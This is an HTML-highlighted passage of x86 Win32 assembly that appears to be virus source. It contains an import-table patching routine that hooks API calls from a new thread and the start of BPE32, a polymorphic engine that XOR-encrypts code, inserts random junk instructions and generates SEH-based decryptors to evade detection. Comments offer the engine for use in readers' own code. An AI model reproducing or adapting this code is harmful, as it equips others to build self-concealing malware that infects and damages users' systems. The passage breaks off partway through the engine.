    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc10">lJMP</span><span class="sc0">             </span><span class="sc1">;check, if it is correct address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;store EDX</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;get counter</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;multiply it by 4</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_edx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;add address to IAT to ptr</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rva2raw</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;is it current address</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;restore EDX</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">sJMP</span><span class="sc0">                </span><span class="sc1">;no, get next address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad.Pushad_eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;store register to stack</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">       </span><span class="sc1">;for l8r use</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0e9h</span><span class="sc0">      </span><span class="sc1">;build JMP or CALL</span><span class="sc0">
</span><span class="sc5">j_or_c</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;get address</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">gmh</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">itDelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;- current address</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">              </span><span class="sc1">;+1-5</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;store built jmp instruction</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">endIT</span><span class="sc0">               </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc10">lJMP</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">endPIT</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">sJMP</span><span class="sc0">                </span><span class="sc1">;search in a loop</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
</span><span class="sc5">endPIT</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">endIT</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">            </span><span class="sc1">;remove SEH frame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">;and quit</span><span class="sc0">
</span><span class="sc5">PatchIT</span><span class="sc0"> </span><span class="sc9">EndP</span><span class="sc0">

</span><span class="sc5">rva2raw</span><span class="sc4">:</span><span class="sc6">pushad</span><span class="sc0">          </span><span class="sc1">;procedure for converting RVAs to RAW pointers</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;0 if actual program</span><span class="sc0">
</span><span class="sc5">r2rp</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">nr2r</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">;no comments needed :)</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">ebx.NT_FileHeader.FH_SizeOfOptionalHeader</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">IMAGE_SIZEOF_FILE_HEADER</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">n_r2r</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">c_r2r</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">n_r2r</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">nr2r</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">c_r2r</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.cPushad</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">NewThread</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;thread starts here</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;store all registers</span><span class="sc0">
    </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">q_hook</span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">2ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get delta parameter</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;zero ECX</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">r2rp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">g_hook</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">newHookers</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;take address to hooker</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;is it 0?</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">q_hook</span><span class="sc0">               </span><span class="sc1">;yeah, quit</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">GMHA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;store address</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">crchAPIs</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;store CRC32</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">GMHA</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PatchIT</span><span class="sc0">                </span><span class="sc1">;and patch Import Table</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">oldHookers</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;save old hooker</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">;increment counter</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">g_hook</span><span class="sc0">              </span><span class="sc1">;loop</span><span class="sc0">
</span><span class="sc5">q_hook</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">
    </span><span class="sc6">popad</span><span class="sc0">                   </span><span class="sc1">;restore all registers</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">;and terminate thread</span><span class="sc0">


</span><span class="sc1">;BPE32 (Benny's Polymorphic Engine for Win32) starts here. U can find first</span><span class="sc0">
</span><span class="sc1">;version of BPE32 in DDT#1 e-zine. But unfortunately, how it usualy goes,</span><span class="sc0">
</span><span class="sc1">;there were TWO, REALLY SILLY/TINY bugs. I found them and corrected them. So,</span><span class="sc0">
</span><span class="sc1">;if u wanna use BPE32 in your code, use this version, not that version from</span><span class="sc0">
</span><span class="sc1">;DDT#1. Very BIG sorry to everyone, who had/has/will have problems with it.</span><span class="sc0">
</span><span class="sc1">;I also included there SALC opcode as a junk instruction.</span><span class="sc0">

</span><span class="sc5">BPE32</span><span class="sc0">   </span><span class="sc9">Proc</span><span class="sc0">
    </span><span class="sc6">pushad</span><span class="sc0">                  </span><span class="sc1">;save all regs</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;save these regs for l8r use</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                </span><span class="sc1">;preserve this reg</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;generate random junk instructions</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">;restore it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0e8h</span><span class="sc0">                </span><span class="sc1">;create CALL instruction</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;calculate size of CALL+junx</span><span class="sc0">
    </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;save it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">xor_key</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">  </span><span class="sc1">;use it as xor constant</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                  </span><span class="sc1">;get random number</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">key_inc</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">mgdelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">  </span><span class="sc1">;use it as key increment constant</span><span class="sc0">
</span><span class="sc5">x_loop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsd</span><span class="sc0">                   </span><span class="sc1">;load DWORD</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                </span><span class="sc1">;encrypt it</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;store encrypted DWORD</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">;increment key</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">x_loop</span><span class="sc0">             </span><span class="sc1">;next DWORD</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rjunk</span><span class="sc0">              </span><span class="sc1">;generate junx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0006e860h</span><span class="sc0">          </span><span class="sc1">;generate SEH handler</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">648b0000h</span><span class="sc0">          </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0ceb0824h</span><span class="sc0">          </span><span class="sc1">;   ...</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;   ...</span><span class="sc0">

</span><span class="sc5">greg0</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">get_reg</span><span class="sc0">                </span><span class="sc1">;get random register</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">               </span><span class="sc1">;MUST NOT be EBP register</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">greg0</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;store register</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11</span><span class="sc0">              </span><span class="sc1">;proc parameter (do not generate MOV)</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">make_xor</span><span class="sc0">               </span><span class="sc1">;create XOR or SUB instruction</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">;destroy parameter</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">64h</span><span class="sc0">             </span><span class="sc1">;generate FS:</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;store it</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">896430ffh</span><span class="sc0">          </span><span class="sc1">;next SEH instructions</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">               </span><span class="sc1">;change register</span><span class="sc0">
    </span><span class="sc6">stosd</span><span class="sc0">                   </span><span class="sc1">;store them</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">             </span><span class="sc1">;   ...</span><span class="sc0">
